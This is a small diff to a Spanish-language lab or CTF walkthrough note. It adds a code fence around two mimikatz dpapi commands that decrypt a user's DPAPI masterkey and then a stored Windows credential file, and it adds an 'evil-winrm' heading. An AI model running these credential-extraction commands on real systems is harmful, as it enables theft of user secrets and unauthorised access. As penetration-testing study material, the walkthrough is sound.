@@ -358,7 +358,11 @@ estaremos a la escucha
 
 `obtenemos el SID`
 ![[Pasted image 20240404213942.png]]
-
+```python
 dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
 
 dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166 
+```
+
+### evil-winrm
+![[Pasted image 20240404215908.png]]
